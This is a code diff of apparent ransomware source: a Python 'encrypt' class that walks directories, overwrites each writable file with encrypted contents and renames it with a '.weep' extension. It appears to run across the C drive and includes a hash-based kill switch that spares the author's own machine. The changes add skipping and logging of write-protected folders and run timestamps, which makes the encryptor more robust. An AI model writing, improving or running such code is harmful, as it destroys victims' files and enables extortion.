@@ -61,6 +61,16 @@ class encrypt(object):
                         
                         #   use try block here with with block
                         try:
+                            if not os.access(walkingdir, os.W_OK):
+                                if os.path.exists('writedenied.txt'):
+                                    filemode ='a'
+                                else:
+                                    filemode ='w'
+                                with open('writedenied.txt',filemode,encoding='utf-8') as f:
+                                    f.write(walkingdir+'\n')
+                                continue
+                            else:
+                                pass
                             with open(walkingdir,'rb+') as f:
                                 data = f.read()
                                 f.seek(0)
@@ -68,11 +78,7 @@ class encrypt(object):
                                 f.write(self.encrypt(data))
                             os.rename(walkingdir,walkingdir+'.weep')
                         except Exception as exception:
-                            if os.path.exists('errorfile.txt'):
-                                writemode ='a'
-                            else:
-                                writemode ='w'
-                            with open('errorfile.txt',writemode,encoding='utf-8') as f:
+                            with open('errorfile.txt','a',encoding='utf-8') as f:
                                 f.write(str(exception))
                                 f.write('\n')
     def runinC(self):
@@ -115,16 +121,24 @@ class encrypt(object):
 if __name__ == "__main__":
     hash = hashlib.md5(encrypt.EmergencyBreak().encode('utf-8')).hexdigest()
     try:
+        localtime = time.asctime( time.localtime(time.time()) )
+        with open('errorfile.txt','w',encoding='utf-8') as f:
+            f.write(str(localtime))
+            f.write('\n')
+
         if hash =='8abe12940cc6d19c7984cbe78ebe6213':#break on my machine                             #Comment this line for test 
             exit()                                                                                        #Comment this line for test
         testobj = encrypt()
         testobj.run()
         testobj.runinC()                                                                                  #Comment this line for test
+        localtime2 = time.asctime(time.localtime(time.time()))
+        
+        with open('errorfile.txt','a',encoding='utf-8') as f:
+            f.write(str(localtime2))
+            f.write('\n')
+        
     except Exception as exception:
-        if os.path.exists('errorfile.txt'):
-            writemode = 'a'
-        else:
-            writemode ='w'
-        with open('errorfile.txt',writemode,encoding='utf-8')as f:
+        with open('errorfile.txt','a',encoding='utf-8')as f:
             f.write(str(exception))
-            f.write('\n')    
+            f.write('\n')
+    
